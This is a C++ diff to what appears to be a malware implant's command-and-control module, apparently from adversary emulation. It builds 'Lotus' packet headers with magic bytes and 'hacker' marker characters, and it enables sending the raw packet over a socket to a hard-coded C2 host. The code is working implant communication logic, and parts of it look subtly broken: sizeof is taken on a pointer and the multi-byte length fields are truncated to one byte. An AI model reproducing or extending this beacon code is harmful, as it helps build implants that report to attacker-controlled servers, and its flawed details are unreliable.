@@ -28,48 +28,40 @@ std::string buildPOSTRequestString(std::string lotusPacket) {
     return buf.str();
 }
 
-void buildLotusHeader(unsigned char * head, int data_length, int key_length, unsigned char instruction) {
-    // magic bytes
-    unsigned char magic_bytes[] = {0x3B, 0x91, 0x01, 0x10};
-    memcpy(head, magic_bytes, sizeof(magic_bytes));
+void buildLotusHeader(unsigned char * head, int data_length, int key_length, unsigned char * instruction) {
+    // magic bytes (4 bytes)
+    memcpy(head, MAGIC_BYTES, sizeof(MAGIC_BYTES));
 
     // payload length (4 bytes)
     unsigned char payload_length[] = { (unsigned char)data_length };
     memcpy(&head[4], payload_length, sizeof(payload_length));
 
+    // key length (2 bytes)
     unsigned char key_length_char[] = { (unsigned char)key_length };
     memcpy(&head[8], key_length_char, sizeof(key_length_char));
 
-    //黑
-    unsigned char marker_1[] = { 0xe9, 0xbb, 0x91 };
-    memcpy(&head[19], marker_1, sizeof(marker_1));
+    memcpy(&head[INSTRUCTION_POS], instruction, sizeof(instruction));
 
-    //客
-    unsigned char marker_2[] = { 0xe5, 0xae, 0xa2 };
-    memcpy(&head[24], marker_2, sizeof(marker_2));
+    memcpy(&head[MARKER_1A_POS], MARKER_1, sizeof(MARKER_1));
 
-    unsigned char instruction_arr[] = { instruction };
-    memcpy(&head[27], instruction_arr, sizeof(instruction_arr));
+    memcpy(&head[MARKER_2_POS], MARKER_2, sizeof(MARKER_2));
 
-    //黑
-    memcpy(&head[66], marker_1, sizeof(marker_1));
+    memcpy(&head[MARKER_1B_POS], MARKER_1, sizeof(MARKER_1));
 
-    //9
-    unsigned char marker_3[] = { 0x39 };
-    memcpy(&head[77], marker_3, sizeof(marker_3));
+    memcpy(&head[MARKER_3_POS], MARKER_3, sizeof(MARKER_3));
 }
 
 EXPORT
-void sendRequest(const char * type, const std::vector<unsigned char> data, unsigned char ** response, int ** response_length, unsigned char instruction) {
+void sendRequest(const char * type, const std::vector<unsigned char> data, unsigned char ** response, int ** response_length, unsigned char ** instruction) {
     char httpGET[] = "GET";
     char httpPOST[] = "POST";
     std::string requestBody;
 
     std::string key = "";
 
-    unsigned char header[82] = { 0 };
-    buildLotusHeader(header, data.size(), key.length(), instruction);
-    std::vector<unsigned char> lotus_packet(header, header + 82);
+    unsigned char header[HEADER_LENGTH] = { 0 };
+    buildLotusHeader(header, data.size(), key.length(), *instruction);
+    std::vector<unsigned char> lotus_packet(header, header + HEADER_LENGTH);
     
     // append key after header
     // lotus_packet.insert(lotus_packet.end(), key.begin(), key.end());
@@ -93,7 +85,7 @@ void sendRequest(const char * type, const std::vector<unsigned char> data, unsig
     }
 
     // uncomment to overwrite the request string while C2 doesn't have HTTP request functionality
-    // requestBody = lotus_packet_str;
+    requestBody = lotus_packet_str;
 
     // create socket
     std::string host = "10.37.129.4";
@@ -128,6 +120,11 @@ void sendRequest(const char * type, const std::vector<unsigned char> data, unsig
 
     // receive data from socket
     bytes_read = read(sock, buffer, RESP_BUFFER_SIZE);
+
+    if (bytes_read < 0) {
+        std::cout << "[COMMS] No response received" << std::endl;
+        return;
+    }
 
     // update response buffer and response length values for return to caller
     memcpy(*response, buffer, bytes_read);
